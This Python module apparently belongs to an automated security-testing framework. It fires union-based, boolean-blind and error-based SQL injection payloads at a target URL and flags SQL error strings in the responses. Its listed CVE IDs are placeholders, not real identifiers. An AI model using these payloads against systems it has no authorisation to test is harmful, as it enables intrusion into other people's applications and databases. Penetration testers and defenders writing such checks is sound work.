"""
SQL Injection Exploit (CWE-89) - Classic SQL injection attack.

Tests for SQL injection vulnerabilities via union-based and boolean-based techniques.

Author: MAXIMUS Wargaming Team
Date: 2025-10-11
"""

import asyncio
import httpx
import time
from typing import Dict, Optional

from exploit_database import ExploitResult, ExploitStatus, ExploitCategory


# Exploit Metadata
EXPLOIT_ID = "cwe_89_sql_injection"
NAME = "SQL Injection - Union Based"
DESCRIPTION = "Tests for SQL injection via UNION SELECT and boolean-based blind techniques"
CATEGORY = "sql_injection"
CWE_IDS = ["CWE-89"]
CVE_EXAMPLES = [
    "CVE-2024-SQL-001",  # Example CVEs
    "CVE-2023-SQL-123",
]


async def execute(
    target_url: str,
    timeout: int = 30,
    **kwargs
) -> ExploitResult:
    """
    Execute SQL injection exploit.
    
    Args:
        target_url: Target application URL (e.g., "http://localhost:8080/api/users")
        timeout: Max execution time in seconds
        **kwargs: Additional parameters (param_name, etc)
    
    Returns:
        ExploitResult with success=True if injection worked
    
    Example:
        >>> result = await execute("http://vuln-app/api/users?id=1")
        >>> print(f"Exploit {'succeeded' if result.success else 'failed'}")
    """
    start_time = time.time()
    output_lines = []
    
    try:
        # SQL injection payloads
        payloads = [
            # Union-based
            "1' UNION SELECT NULL,NULL,NULL--",
            "1' UNION SELECT 'SQLi','test','success'--",
            "1' UNION SELECT database(),user(),version()--",
            
            # Boolean-based blind
            "1' AND '1'='1",
            "1' AND '1'='2",
            "1' OR '1'='1",
            
            # Error-based
            "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,0x3a,(SELECT version()),0x3a,0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)y)--",
        ]
        
        param_name = kwargs.get("param_name", "id")
        
        async with httpx.AsyncClient(timeout=timeout) as client:
            for payload in payloads:
                output_lines.append(f"Testing payload: {payload[:50]}...")
                
                # Inject payload in query parameter
                params = {param_name: payload}
                
                try:
                    response = await client.get(target_url, params=params)
                    
                    # Check for SQL injection indicators
                    response_text = response.text.lower()
                    
                    indicators = [
                        "sql syntax",
                        "mysql",
                        "postgresql",
                        "sqlite",
                        "database error",
                        "syntax error",
                        "sqlstate",
                        "union",
                        "information_schema",
                    ]
                    
                    for indicator in indicators:
                        if indicator in response_text:
                            duration = time.time() - start_time
                            output_lines.append(f"✓ SQL injection confirmed: '{indicator}' found in response")
                            
                            return ExploitResult(
                                exploit_id=EXPLOIT_ID,
                                category=ExploitCategory(CATEGORY),
                                status=ExploitStatus.SUCCESS,
                                success=True,
                                output="\n".join(output_lines),
                                error=None,
                                duration_seconds=duration,
                                metadata={
                                    "payload": payload,
                                    "indicator": indicator,
                                    "target_url": target_url
                                }
                            )
                    
                    output_lines.append(f"  No indicators found (status: {response.status_code})")
                    
                except httpx.HTTPError as e:
                    output_lines.append(f"  HTTP error: {e}")
        
        # No injection detected
        duration = time.time() - start_time
        output_lines.append("✗ No SQL injection detected (likely patched)")
        
        return ExploitResult(
            exploit_id=EXPLOIT_ID,
            category=ExploitCategory(CATEGORY),
            status=ExploitStatus.FAILED,
            success=False,
            output="\n".join(output_lines),
            error=None,
            duration_seconds=duration,
            metadata={"target_url": target_url}
        )
        
    except asyncio.TimeoutError:
        duration = time.time() - start_time
        return ExploitResult(
            exploit_id=EXPLOIT_ID,
            category=ExploitCategory(CATEGORY),
            status=ExploitStatus.TIMEOUT,
            success=False,
            output="\n".join(output_lines),
            error="Exploit execution timeout",
            duration_seconds=duration,
            metadata={"target_url": target_url}
        )
    
    except Exception as e:
        duration = time.time() - start_time
        return ExploitResult(
            exploit_id=EXPLOIT_ID,
            category=ExploitCategory(CATEGORY),
            status=ExploitStatus.ERROR,
            success=False,
            output="\n".join(output_lines),
            error=str(e),
            duration_seconds=duration,
            metadata={"target_url": target_url}
        )
